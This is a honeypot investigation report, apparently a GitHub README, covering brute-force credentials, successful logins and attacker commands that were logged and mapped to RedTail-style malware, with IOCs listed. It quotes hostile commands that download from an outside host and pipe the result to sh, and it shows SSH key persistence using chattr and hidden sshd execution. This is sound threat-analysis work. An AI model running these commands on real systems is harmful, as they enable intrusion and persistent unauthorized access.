
The honeypot was operated continuously for more than one month, during which it accumulated a substantial volume of network traffic, authentication attempts, commands, and other security-related events. Given the scale of the collected dataset, performing an exhaustive analysis of every event would require significant time and effort and would extend beyond the practical scope of this investigation. Therefore, rather than attempting to analyze the entire dataset, the following sections focus on **selected segments and time intervals throughout the honeypot's operational period**. These samples were chosen to provide representative coverage of the different types of activity observed while also highlighting particularly interesting, unusual, or security-relevant events. This approach allows the investigation to identify meaningful attack patterns and behaviors while keeping the analysis manageable and focused.

NOTE: To view some of the data discussed in this article, check the "[HoneyPot Data] (https://github.com/Mahmoud-Matar/HoneyBot-Investigation-Data/tree/main/HoneyPot%20Data)" folder in this repo


<img width="1500" height="707" alt="image" src="https://github.com/user-attachments/assets/e0e601aa-3141-404d-9421-2a270bdf7046" />

# 1. Brute-Force Credential Taxonomy

## A. Username taxonomy

After analyzing over 41 million logs, at the moment of writing the report, some of the top 50  usernames used for brute-force SSH/RDP and other protocols are:


<img width="927" height="473" alt="Username Tagcloud" src="https://github.com/user-attachments/assets/de29c51a-ed54-487d-8bf0-422f57e69c7d" />


Some usernames indicate a specific target in the brute-forcing.  Looking at these usernames, there are several target-specific clusters hiding inside what initially looks like generic brute forcing. Some of these clearly indicate attempts to target particular technologies, applications, cloud environments, or organizations.

| Category                               | Username                                                                                                                                 | What it may indicate                                                                                                                                               |
| -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Generic Linux / Unix**               | `root`, `admin`, `user`, `ubuntu`, `debian`, `pi`                                                                                        | Generic SSH/Linux scanning and common default-account attacks                                                                                                      |
| **Windows / Active Directory**         | `Administrator`, `Administrator1`, `administrator`, `ADMINISTRATOR`, `Administrateur`, `administrateur`, `Administrador`, `Administraor` | **Potential Windows/AD targeting**.                                                                                                                                |
| **Generic administrative accounts**    | `admin`, `ADMIN`, `admin1`, `support`, `server`                                                                                          | Attempts against common administrative or management accounts                                                                                                      |
| **Developer / DevOps**                 | `dev`, `developer`, `devops`, `deploy`, `deployer`, `runner`, `git`                                                                      | Targeting development environments, CI/CD infrastructure, source-control systems, or deployment servers                                                            |
| **Database / Data Services**           | `postgres`, `sa`, `oracle`                                                                                                               | Targeting database services or systems commonly associated with SQL Server (`sa`), PostgreSQL, and Oracle                                                          |
| **Application / Web Services**         | `appuser`, `testuser`, `ftpuser`, `post`, `frappe`                                                                                       | Potential targeting of application/service accounts and web/application infrastructure                                                                             |
| **Cloud / Infrastructure**             | `cloud`, `server`, `runner`, `deploy`, `deployer`                                                                                        | Possible targeting of cloud-hosted infrastructure, CI/CD runners, or automated deployment systems                                                                  |
| **Testing / Development**              | `test`, `testuser`, `user1`, `dev`, `developer`, `student`                                                                               | Likely targeting of development, testing, educational, or poorly secured environments                                                                              |
| **Scanning / Reconnaissance Accounts** | `scanner`, `scan`, `scans`, `bot`                                                                                                        | These are particularly interesting because the username itself suggests **automated scanning/reconnaissance infrastructure** rather than a legitimate user account |
| **Guest / Low-Privilege Accounts**     | `guest`, `user`, `user1`                                                                                                                 | Attempts to exploit commonly enabled or weakly protected low-privilege accounts                                                                                    |
| **Gaming / Minecraft**                 | `minecraft`                                                                                                                              | **Potential Minecraft server targeting** or Linux hosts running Minecraft infrastructure                                                                           |
| **AI / Emerging Software**             | `claude`, `openclaw`                                                                                                                     | Potential targeting of systems running AI-related software or newly popular applications                                                                           |
| **Named / Human-like Accounts**        | `sam`, `alex`, `bob`                                                                                                                     | Possible username dictionaries derived from common human usernames or leaked credentials                                                                           |
| **Generic Service Accounts**           | `service`-like names such as `support`, `runner`, `appuser`, `server`                                                                    | Attempts against accounts commonly created for automated services or applications                                                                                  |

##  B. Password Taxonomy

Similarly, some of the top 50  passwords used for brute-force SSH/RDP and other protocols are:


<img width="928" height="475" alt="Password Tagcloud" src="https://github.com/user-attachments/assets/01226332-6938-4a92-a4df-a6ca1f2508c9" />


It looks like events from multiple protocols & services being normalized into a common field, or you're looking at a field whose meaning isn't universally "password."

# 2. Successful Logins

While Filtering for successful authentication to the honeypot service, during that server uptime it was logged over 400 successful-login records on SSH and Telnet Protocols.


<img width="1917" height="816" alt="Succ_logins logs" src="https://github.com/user-attachments/assets/f5b3905c-19b8-4caa-af4c-62d260606a1e" />


By exporting the values of | @timestamp | src_ip | username | password | message | protocol | to a .csv file to do further analysis it was found that . 

There are 199 unique IP.  Each of them with successful authentication

| Protocol | Username | Password   | Source          |
| -------- | -------- | ---------- | --------------- |
| SSH      | `root`   | `password` | 92.118.39.14    |
| SSH      | `admin`  | `password` | 91.92.42.227    |
| SSH      | `root`   | `123456`   | 217.60.255.130  |
| SSH      | `admin`  | `admin`    | 195.178.110.232 |
| Telnet   | `root`   | `123456`   | 45.198.224.26   |
| Telnet   | `user`   | `user`     | 94.154.43.196   |
However 
Unique IPs had many successful authentication

For example,
 IP **195.178.110.232** successfully logged in with  values

```
root:123123
root:1234
root:123456
root:12345678
root:admin
admin:admin
admin:password
```

Some other finding include:
1. Multiple IPs demonstrated repeated successful authentication using
   numerous credential pairs.

2. Device/vendor-specific credential clusters were observed, including
   Cisco, Huawei, Orange Pi, DrayTek, and embedded-device credentials.

3. Public-key SSH authentication was recorded for the `root` account.


# 3. Post-Authentication Command Execution Analysis

 500 executed commands were exported into an excel sheet during one time interval. Because the exported dataset did not include source IP address or session identifiers for every command, individual commands could not always be reliably attributed to a particular attacker. Therefore, the findings below describe observed behaviors and command sequences, while attribution between separate activity clusters should be treated cautiously.

## A. System and Environment Reconnaissance

Multiple commands were used to identify characteristics of the honeypot session environment.

Observed commands included:

```
id
uname -a
ifconfig
cat /proc/cpuinfo
```

This activity is consistent with **post-authentication system reconnaissance**. On its own, these commands are not malicious; however, their presence immediately before payload retrieval or execution can provide evidence that an attacker was fingerprinting the system before deploying malware.

## B. Cryptocurrency Miner Discovery

The following commands were observed:

```
ps -ef | grep '[Mm]iner'
ps | grep '[Mm]iner'
cat /proc/cpuinfo
```

The presence of commands like 
`ps -ef | grep '[Mm]iner'
`ps | grep '[Mm]iner'`
suggests attempts to identify and  cryptocurrency mining processes, indicating that attackers are trying to identify and deploying cryptojacking malware.

## C. Specialized IoT and Telephony Reconnaissance

One of the more unusual findings was the presence of commands searching for resources associated with networking equipment, modems, SMS services, and Telegram.

Examples included:

```
/ip cloud print
```

and searches involving:

```
TelegramDesktop/tdata
/dev/ttyGSM*
/dev/ttyUSB-mod*
/dev/modem*
/var/spool/sms/*
/var/log/smsd.log
/etc/smsd.conf*
/usr/bin/qmuxd
/var/qmux_connect_socket
/etc/config/simman
```

These are not typical commands one would expect from a generic Linux vulnerability scanner.

The paths indicate interest in:

- MikroTik networking functionality
- Telegram desktop data
- GSM/modem devices
- SMS daemon configuration
- SMS message storage
- modem-management software
- SIM-management components

This activity suggests that at least one observed tool or campaign was designed with knowledge of **IoT, embedded Linux, networking, or telephony environments**.

## D. Payload Delivery from 217.60.195.113

evidence of malicious activity was a command sequence involving:

```
217.60.195.113
```

The observed sequence attempted to retrieve a file named `sh` using SCP:

```
scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh
```

If the SCP operation failed, the command used HTTP/S-based fallback mechanisms:

```
wget --no-check-certificate -qO- https://217.60.195.113/sh
```

or:

```
curl -sk https://217.60.195.113/sh
```

The retrieved content was then passed to a shell:

```
| sh -s telnet
```

The overall logic can therefore be represented as:

```
Attempt SCP download
       │
       ├── Success ──> chmod +x out_sh ──> sh out_sh telnet
       │
       └── Failure
              │
              ├── wget /sh
              │
              └── curl /sh
                       │
                       ▼
                    execute
                       │
                       ▼
                    telnet
```



This behavior is consistent with **automated malware deployment**.

The use of multiple download mechanisms also demonstrates resilience: if SCP was unavailable, the attacker could fall back to HTTPS retrieval.

## E. SSH Configuration Evasion

Before using SCP, the attacker created an SSH configuration containing:

```
StrictHostKeyChecking no
UserKnownHostsFile /dev/null
```

This disables normal SSH host-key verification and prevents the connection from maintaining a normal known-hosts record.

The attacker also used:

```
chmod 400 key.ppk
```

to restrict access to the private key before using it.



## F. Hidden SSHD Executables


The command data contained executions resembling:

```
chmod +x ./.1127324881294476003/sshd
nohup ./.1127324881294476003/sshd ...
```

and:

```
chmod +x ./.4544623924746369218/sshd
nohup ./.4544623924746369218/sshd &
```

Several characteristics make this activity suspicious:

- The executable was named `sshd`.
- It was located inside a hidden directory.
- The directory name appeared random.
- Execute permissions were explicitly enabled.
- `nohup` was used to keep the process running after the shell session ended.
- The binary was executed outside the expected system location for the legitimate SSH daemon.

The behavior can be summarized as:

```
Hidden directory
      ↓
sshd binary
      ↓
chmod +x
      ↓
nohup
      ↓
background execution
```

## G. SSH Key Persistence

The following sequence was observed:

```
mkdir -p ~/.ssh
chattr -ia ~/.ssh/authorized_keys
echo "ssh-rsa AAAA...." > ~/.ssh/authorized_keys
chattr +ai ~/.ssh/authorized_keys
```

The attacker first ensured that the `.ssh` directory existed.

They then removed the existing `immutable` and `append-only` attributes from `authorized_keys`:

```
chattr -ia ~/.ssh/authorized_keys
```

An attacker-controlled public key was then written to the file.

Finally:

```
chattr +ai ~/.ssh/authorized_keys
```

was used to apply both attributes again.

The important behavior is:

```
Remove file protections
        ↓
Install attacker SSH key
        ↓
Re-enable file protections
```

The observed command sequence demonstrates an attempt to establish persistent SSH access by replacing the existing `authorized_keys` file with an attacker-controlled public key and protecting the file using filesystem attributes. The dataset does not independently confirm whether the corresponding private key was subsequently used for authentication.

## H. Staging and Cleanup

The command data also contained sequences involving:

```
chmod +x clean.sh
sh clean.sh
rm -rf clean.sh

chmod +x setup.sh
sh setup.sh
rm -rf setup.sh
```

This indicates a deployment process involving temporary scripts.

The scripts were:

1. Made executable.
2. Executed.
3. Deleted afterward.

The pattern is:

```
setup script
     ↓
execute
     ↓
delete

cleanup script
     ↓
execute
     ↓
delete
```

### Assessment

Deleting deployment scripts reduces the number of artifacts left behind after execution.

This behavior is consistent with **artifact cleanup / defense evasion**, although the exact contents of the scripts would be required to determine precisely what they performed.

## I. RedTail Indicator

One particularly important artifact was an encoded string:

```
\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B
```

Decoding the hexadecimal bytes produces:

```
redtail_bot_telnet_ok
```

The decoded string `redtail_bot_telnet_ok` is a strong indicator that the retrieved script was associated with RedTail-style bot/Telnet deployment. Combined with the payload retrieval behavior and the external infrastructure involved, the activity is highly consistent with RedTail malware deployment.

### Assessment

The combination of:

```
redtail_bot_telnet_ok
217.60.195.113
wget/curl/scp
telnet
hidden sshd
SSH persistence
```

provides strong evidence of automated malware deployment rather than ordinary interactive administration.

## J. MITRE ATT&CK Mapping

The observed behavior can be mapped to several MITRE ATT&CK techniques.

| Observed behavior                    | ATT&CK technique                                    | Relevance                        |
| ------------------------------------ | --------------------------------------------------- | -------------------------------- |
| `uname`, `ifconfig`, `/proc/cpuinfo` | System Information Discovery                        | Host fingerprinting              |
| `ps`, miner searches                 | Process Discovery                                   | Identifying running processes    |
| `wget`, `curl`, `scp`                | T1105 — Ingress Tool Transfer                       | Payload delivery                 |
| `sh`, hidden `sshd` execution        | T1059 — Command and Scripting Interpreter           | Command execution                |
| SSH `authorized_keys` modification   | T1098.004 — Additional SSH Authorized Keys          | Persistence                      |
| `nohup` execution                    | Command/Process execution                           | Maintaining execution            |
| Deleting scripts                     | File/deletion-based defense evasion                 | Artifact removal                 |
| `chattr +ai`                         | File/directory permission or attribute manipulation | Protecting persistence artifacts |

The ATT&CK mappings should be considered analytical classifications rather than proof that the malware implements every associated technique.

## K.  Key Indicators of Compromise (IOCs)

### IP addresses

```
217.60.195.113
```

This IP appeared directly in the payload retrieval commands.

Additional IP addresses supplied as arguments to the hidden `sshd` process should also be extracted and investigated individually.

### Files

```
sh
out_sh
clean.sh
setup.sh
key.ppk
sshcfg
./.1127324881294476003/sshd
./.4544623924746369218/sshd
~/.ssh/authorized_keys
```

### Indicators

```
redtail_bot_telnet_ok
auth_ok
StrictHostKeyChecking no
UserKnownHostsFile /dev/null
```

### Commands of interest

```
scp -F sshcfg -i key.ppk
ps -ef | grep '[Mm]iner'
ps | grep '[Mm]iner'
cat /proc/cpuinfo
wget --no-check-certificate
curl -sk
chmod +x
nohup
chattr -ia
chattr +ai
```


# 4. What Malware was dropped on the Server?

For the last section, I will try to find what kind of malware were deployed on the honeypot. Instead of examining every directory on the server and try to guess, I will use ClamAV because it is a free, open-source cross-platform antivirus. 

ClamAV identified multiple malware artifacts within T-Pot's captured data, including cryptocurrency miners, Mirai, XorDDoS, WannaCry-related ransomware, and other Windows and Linux malware. These detections demonstrate that malicious payloads were delivered to or captured by the honeypot services; they do not independently establish execution or infection of the underlying Oracle Cloud host.


<img width="1230" height="427" alt="clamAV scan Results" src="https://github.com/user-attachments/assets/50b87426-141f-4a3e-bb0b-c600d89ce4e4" />


# 5. Conclusion

The investigation demonstrates that the honeypot attracted automated and post-authentication activity from multiple external sources. More than 4 million attacks were collected during the observation period, including hundreds of successful authentication records and extensive command activity. Analysis of selected sessions revealed system reconnaissance, process discovery, specialized IoT and telephony reconnaissance, automated payload retrieval, suspicious executable execution, SSH persistence, and artifact cleanup.

The strongest evidence of post-authentication malicious behavior was the modification of `~/.ssh/authorized_keys`, execution of hidden `sshd` binaries using `nohup`, and automated retrieval of payloads through SCP with HTTPS-based fallback mechanisms. The payload retrieval infrastructure and the `redtail_bot_telnet_ok` marker were also highly consistent with automated RedTail/Telnet malware deployment.

ClamAV further identified multiple malware families within artifacts captured by T-Pot, including cryptocurrency miners, Mirai, XorDDoS, and other Windows and Linux malware. These detections demonstrate that malicious payloads reached the honeypot services, but they do not independently prove infection of the underlying Oracle Cloud host.
